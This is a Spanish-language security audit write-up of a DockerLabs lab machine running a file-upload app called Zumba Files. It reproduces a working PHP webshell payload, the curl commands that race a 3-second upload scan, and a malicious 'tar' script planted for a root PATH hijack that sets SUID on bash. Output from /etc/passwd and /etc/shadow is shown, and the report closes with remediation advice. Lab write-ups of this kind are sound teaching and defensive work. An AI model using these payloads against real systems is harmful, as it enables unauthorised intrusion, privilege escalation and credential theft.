# Reporte de Auditoría de Seguridad — Zumba Files (DockerLabs "toctou")

**Fecha:** 31 de octubre de 2026
**Objetivo:** `http://172.17.0.2/`
**Alcance:** Aplicación web Zumba Files y sistema contenedor asociado
**Tipo de prueba:** Auditoría de ciberseguridad ofensiva / hacking ético (caja gris, entorno de laboratorio autorizado)
**Resultado global:** **CRÍTICO — Compromiso total del contenedor (RCE remoto sin autenticación + escalada a root)**

---

## 1. Resumen ejecutivo

La aplicación "Zumba Files" permite subir archivos sin autenticación. El endpoint `/upload.php` implementa una validación **TOCTOU (Time-of-Check to Time-of-Use)**: comprueba únicamente los *magic bytes* de imagen, guarda el archivo en `/uploads` con su **nombre y extensión originales**, y **después** ejecuta un análisis de contenido con una pausa artificial de 3 segundos. Durante esa ventana el archivo malicioso ya es accesible y ejecutable por Apache/PHP.

Aprovechando esa ventana se obtuvo **ejecución remota de comandos (RCE)** como el usuario `www-data`, y se creó un webshell persistente. Posteriormente, se identificó que el cron del sistema ejecuta cada minuto `/opt/zumba/backup.sh` como **root**, el cual antepone al `PATH` el directorio `/opt/zumba/bin`, **escribible por `www-data`**. Secuestrando el binario `tar` se consiguió **ejecución como root** y lectura de `/etc/shadow`.

No fue necesario autenticarse ni explotar vulnerabilidades del kernel: la cadena completa se basa en dos fallos de diseño/configuración de la propia aplicación y del contenedor.

| # | Vulnerabilidad | Severidad | CVSS 3.1 (aprox.) | Impacto |
|---|---|---|---|---|
| 1 | TOCTOU en `/upload.php` permite ejecutar PHP antes del escaneo | **Crítica** | 8.1 – 9.8 | RCE como `www-data` sin autenticación |
| 2 | PATH hijack en cron root (`/opt/zumba/backup.sh` + `/opt/zumba/bin`) | **Alta** | 7.8 | Escalada de privilegios a `root` |
| 3 | Subida de archivos ejecutables y listado de directorio en `/uploads/` | Alta | 7.5 | Facilita el despliegue y localización de webshells |
| 4 | Validación de contenido insuficiente (solo `<?php`, `<?=`, `<script`) | Media | 5.3 | Bypass del "antivirus" de contenido |
| 5 | Divulgación de versión de servidor y ausencia de endurecimiento HTTP | Baja | 3.7 | Fingerprinting y superficie de ataque |

---

## 2. Metodología

1. Reconocimiento de puertos y servicios con `nmap`.
2. Enumeración HTTP: páginas públicas, `robots.txt`, directorios, `app.js`, endpoints.
3. Análisis del flujo de subida y pruebas controladas de carga de archivos.
4. Confirmación de la ventana TOCTOU mediante peticiones concurrentes.
5. Obtención de RCE y revisión del código fuente (`/var/www/html/upload.php`) desde el propio host comprometido.
6. Enumeración local: usuarios, SUID, cron, permisos y directorios escribibles.
7. Escalada de privilegios mediante PATH hijack y verificación con `euid=0`.

### Reconocimiento

```bash
sudo nmap -sS -sC -sV -p- 172.17.0.2
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.69 ((Debian))
|_http-server-header: Apache/2.4.69 (Debian)
|_http-title: Zumba Files \xE2\x80\x94 Env\xC3\xADa archivos en segundos
```


```bash
sudo nmap -p 80 --script vuln 172.17.0.2
```

```text
| http-enum: 
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.69 (debian)'
```

- Única superficie expuesta: HTTP/80.
- Aplicación PHP con uploader sin autenticación.
- Directorio `/uploads/` con **listado de directorios habilitado**.

---

## 3. Hallazgos técnicos

### 3.1. CRÍTICO — TOCTOU en `/upload.php` con ejecución de PHP

**Descripción**

El código de `/var/www/html/upload.php` realiza el siguiente flujo:

1. Comprueba solo los primeros 12 bytes (firma de imagen PNG/JPG/GIF/BMP).
2. Mueve el archivo a `/var/www/html/uploads/<nombre_original>`.
3. Ejecuta `sleep(3)` simulando un análisis profundo.
4. Solo después lee el contenido y borra el archivo si contiene `<?php`, `<?=` o `<script`.

Es decir, el archivo se publica y se ejecuta **antes** de ser analizado. Cualquier extensión se conserva, incluida `.php`.

**Evidencia**

Subida de un archivo con cabecera PNG válida y código PHP:

backdoor.php:

```bash
<?php
@file_put_contents(__DIR__.'/ghost.php', '<?php system($_GET["cmd"]); ?>');
echo "PWN:";
system($_GET['cmd']);
?>
```

```bash
cat ERzHT_3WkAEk6I2.png backdoor.php > image.png.php
curl -F "file=@image.png.php" http://172.17.0.2/upload.php & sleep 1.4
curl "http://172.17.0.2/uploads/image.png.php?cmd=cat+/etc/passwd" --output salida.txt
```

Respuesta durante la ventana de 3 segundos en el output salida.txt:

```text
PWN:root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
```

El mismo payload escribió un webshell persistente (`/uploads/ghost.php`) que sobrevivió al borrado del archivo original:

```text
curl "http://172.17.0.2/uploads/ghost.php?cmd=id"
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El escaneo posterior rechazaba el archivo original, pero ya era demasiado tarde:

```json
{"ok":false,"error":"El análisis detectó contenido potencialmente peligroso. Archivo rechazado."}
```

**Causa raíz**

- Validación y uso no atómicos (TOCTOU).
- Se escribe en el directorio web final antes de validar.
- Se conserva la extensión original y se permite su ejecución por PHP.
- El "escaneo" es una lista negra trivial de cadenas.

**Impacto**

Ejecución remota de comandos sin autenticación como `www-data`, con posibilidad de persistencia, movimiento lateral dentro del contenedor y robo de información.

---

### 3.2. ALTA — PATH hijack en tarea cron ejecutada como root

**Descripción**

Crontab: ls -la /etc/cron* 2>/dev/null

```bash
curl "http://172.17.0.2/uploads/ghost.php?cmd=ls%20-la%20%2Fetc%2Fcron%2A%202%3E%2Fdev%2Fnull"
```

```text
/etc/cron.d:
total 20
drwxr-xr-x 1 root root 4096 Oct 27 22:02 .
drwxr-xr-x 1 root root 4096 Oct 31 19:06 ..
-rw-r--r-- 1 root root  102 Jun 13  2025 .placeholder
-rw-r--r-- 1 root root  712 Dec  4  2024 php
-rw-r--r-- 1 root root  117 Oct 27 22:00 zumba-backup
```

El sistema ejecuta cada minuto como root: cat /etc/cron.d/zumba-backup

```bash
curl "http://172.17.0.2/uploads/ghost.php?cmd=cat%20%2Fetc%2Fcron.d%2Fzumba-backup"
```

```cron
# Copia de seguridad de las subidas de Zumba Files (cada minuto)
* * * * * root /opt/zumba/backup.sh >/dev/null 2>&1
```

El script contiene: cat /opt/zumba/backup.sh

```bash
export PATH=/opt/zumba/bin:$PATH
...
tar -czf "/var/backups/uploads-${STAMP}.tar.gz" . 2>/dev/null
```

El directorio `/opt/zumba/bin` pertenece a `www-data:www-data` y es escribible:

```text
drwxrwxr-x 1 www-data www-data /opt/zumba/bin
```

Al anteponer ese directorio al `PATH`, cualquier binario con el nombre de una utilidad usada por el script (`tar`, `date`, `ls`, `tail`, `xargs`, `rm`) se ejecuta con privilegios de root.

**Evidencia**

Se creó `/opt/zumba/bin/tar` con un payload que, al ejecutarse como root, asignaba SUID a Bash y continuaba con el backup legítimo:

```bash
cd /opt/zumba/bin

cat << 'EOF' > tar
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4755 /bin/bash
exec /usr/bin/tar "$@"
EOF

$ ls -la
total 16
drwxrwxr-x 1 www-data www-data 4096 Oct 31 19:07 .
drwxr-xr-x 1 root     root     4096 Oct 27 22:02 ..
-rwxr-xr-x 1 www-data www-data  138 Oct 31 19:07 tar
```

Tras la ejecución del cron (cada minuto) se obtuvo una shell con privilegios efectivos de root:

```text
$ /bin/bash -p -c "id"
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

Lectura de `/etc/shadow`:

```text
$ /bin/bash -p -c 'cat /etc/shadow'
root:*:20746:0:99999:7:::
daemon:*:20746:0:99999:7:::
bin:*:20746:0:99999:7:::
sys:*:20746:0:99999:7:::
sync:*:20746:0:99999:7:::
games:*:20746:0:99999:7:::
man:*:20746:0:99999:7:::
lp:*:20746:0:99999:7:::
mail:*:20746:0:99999:7:::
news:*:20746:0:99999:7:::
uucp:*:20746:0:99999:7:::
proxy:*:20746:0:99999:7:::
www-data:*:20746:0:99999:7:::
backup:*:20746:0:99999:7:::
list:*:20746:0:99999:7:::
irc:*:20746:0:99999:7:::
_apt:*:20746:0:99999:7:::
nobody:*:20746:0:99999:7:::
systemd-network:!*:20753:::::1:
```

Por ultimo, se buscaron flags o ficheros sensibles en root:

```text
$ /bin/bash -p -c 'find / -maxdepth 4 -iname "*flag*" -o -iname "root.txt" -o -iname "*proof*" 2>/dev/null | head -20'
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
```


**Causa raíz**

- Directorio controlado por un usuario no privilegiado incluido en el `PATH` de un proceso root.
- Uso de comandos sin ruta absoluta en un script ejecutado por cron.
- Tarea programada de backup ejecutada como root sin necesidad.

**Impacto**

Escalada de privilegios local de `www-data` a `root`, con control total del contenedor.

---

### 3.3. ALTA — Subida de archivos ejecutables y directory listing

- No existe comprobación de extensión en servidor; solo se validan los *magic bytes*.
- Los nombres de archivo se conservan y son predecibles.
- `/uploads/` permite listar el contenido, lo que facilita localizar los archivos subidos.
- El directorio de subidas tiene ejecución PHP habilitada.

**Impacto:** facilita el despliegue, descubrimiento y ejecución de webshells; combinado con 3.1 deriva en RCE.

---

### 3.4. MEDIA — Validación de contenido insuficiente

El análisis solo busca las cadenas:

```php
stripos($content, '<?php') !== false ||
stripos($content, '<?=')   !== false ||
stripos($content, '<script') !== false
```

Es una lista negra fácilmente evadible y, sobre todo, **se ejecuta después de publicar el archivo**. No inspecciona realmente el contenido peligroso ni desactiva la ejecución.

---

### 3.5. BAJA — Divulgación de información y endurecimiento HTTP

- `Server: Apache/2.4.69 (Debian)` expone versión y sistema.
- Sin HTTPS, sin cabeceras de seguridad relevantes (`CSP`, `X-Content-Type-Options`, `X-Frame-Options`).
- Sin autenticación ni límites de tasa en el endpoint de subida.

---

## 4. Cadena de explotación completa

```text
1. Subir archivo con cabecera PNG + código PHP a /upload.php
        ↓
2. Durante los 3 s de "análisis", acceder a /uploads/<archivo>.php
        ↓
3. RCE como www-data + creación de webshell persistente
        ↓
4. Enumerar cron: /opt/zumba/backup.sh se ejecuta como root cada minuto
        ↓
5. /opt/zumba/bin es escribible por www-data y está primero en el PATH
        ↓
6. Plantar un `tar` malicioso → se ejecuta como root
        ↓
7. SUID en /bin/bash → euid=0 → lectura de /etc/shadow y control total
```

**Comandos clave utilizados**

```bash
sudo nmap -sS -sC -sV -p- 172.17.0.2
curl -sS http://172.17.0.2/upload.php
curl -F "file=@image.png.php" http://172.17.0.2/upload.php & sleep 1.4
curl "http://172.17.0.2/uploads/image.png.php?cmd=cat+/etc/passwd" --output salida.txt
curl "http://172.17.0.2/uploads/ghost.php?cmd=cat+/etc/passwd"
cat /etc/cron.d/zumba-backup
cat /opt/zumba/backup.sh
/bin/bash -p -c 'cat /etc/shadow'
/bin/bash -p -c 'find / -maxdepth 4 -iname "*flag*" -o -iname "root.txt" -o -iname "*proof*" 2>/dev/null | head -20'
```

---

## 5. Recomendaciones

### Prioridad inmediata (crítico)

1. **Eliminar la condición TOCTOU:** validar el archivo completo en el directorio temporal (`/tmp`) y solo moverlo a su destino final **después** de que pase todas las comprobaciones.
2. **Deshabilitar la ejecución de PHP en `/uploads`:**

   ```apache
   <Directory /var/www/html/uploads>
       php_admin_flag engine off
       RemoveHandler .php .phtml .phar
       RemoveType .php .phtml .phar
   </Directory>
   ```

3. **Whitelist estricta de extensiones y tipos MIME** en servidor, no solo magic bytes.
4. **Renombrar los archivos** con identificadores aleatorios y sin extensión ejecutable.
5. **Impedir el PATH hijack:** eliminar `/opt/zumba/bin` del `PATH` o hacerlo propiedad de root sin permisos de escritura para `www-data`; usar rutas absolutas (`/usr/bin/tar`) en los scripts de cron.
6. **No ejecutar backups como root**; usar un usuario dedicado con privilegios mínimos.

### Prioridad alta

7. Deshabilitar el listado de directorios (`Options -Indexes`).
8. Servir las subidas desde un dominio/almacenamiento separado o fuera del *webroot*.
9. Añadir autenticación, límites de tasa y cuotas de subida.
10. Reemplazar la lista negra de contenido por análisis real (Antivirus/ClamAV, re-codificación de imágenes) y ejecutarlo antes de publicar.

### Prioridad media/baja

11. Ocultar la versión de Apache (`ServerTokens Prod`, `ServerSignature Off`).
12. Forzar HTTPS y añadir cabeceras de seguridad.
13. Ejecutar el contenedor con usuario no root, sistema de archivos de solo lectura y `no-new-privileges`.
14. Revisar y minimizar tareas cron y permisos de directorios del contenedor.

---

## 7. Conclusión

El laboratorio presenta una cadena de compromiso completa y realista: una **vulnerabilidad TOCTOU en la subida de archivos** permite ejecutar código como `www-data` sin autenticación, y una **mala configuración del cron/PATH** permite escalar a `root`. El impacto es máximo: un atacante podría ejecutar comandos, persistir, leer credenciales del sistema y tomar control total del contenedor.

La corrección debe centrarse en **validar antes de publicar**, **deshabilitar la ejecución en el directorio de subidas** y **eliminar directorios escribibles del PATH de procesos privilegiados**.
